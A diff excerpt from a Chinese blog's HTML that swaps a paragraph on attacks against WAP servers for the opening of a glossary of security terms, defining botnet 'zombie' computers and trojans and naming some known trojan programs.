-<p>55.WAP攻击<br>黑客们在网络上疯狂肆虐之后，又将“触角”伸向了WAP（无线应用协议的英文简写），继而WAP成为了他们的又一个攻击目标。“WAP攻击”主要是指攻击WAP服务器，使启用了WAP服务的手机无法接收正常信息。由于目前WAP无线网络的安全机制并非相当严密，因而这一领域将受到越来越多黑客的“染指”。现在，我们使用的手机绝大部分都已支持WAP上网，而手机的WAP功能则需要专门的WAP服务器来支持，若是黑客们发现了WAP服务器的安全漏洞，就可以编制出针对该WAP服务器的病毒，并对其进行攻击，从而影响到WAP服务器的正常工作，使WAP手机无法接收到正常的网络信息。</p>
-
+          <p>1.肉鸡：<br>所谓“肉鸡”是一种很形象的比喻，比喻那些可以随意被我们控制的电脑，对方可以是WINDOWS系统，也可以是UNIX/LINUX系统，可以是普通的个人电脑，也可以是大型的服务器，我们可以象操作自己的电脑那样来操作它们，而不被对方所发觉。</p><p>2.木马：<br>就是那些表面上伪装成了正常的程序，但是当这些被程序运行时，就会获取系统的整个控制权限。有很多黑客就是热中与使用木马程序来控制别人的电脑，比如灰鸽子，黑洞，PcShare等等。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
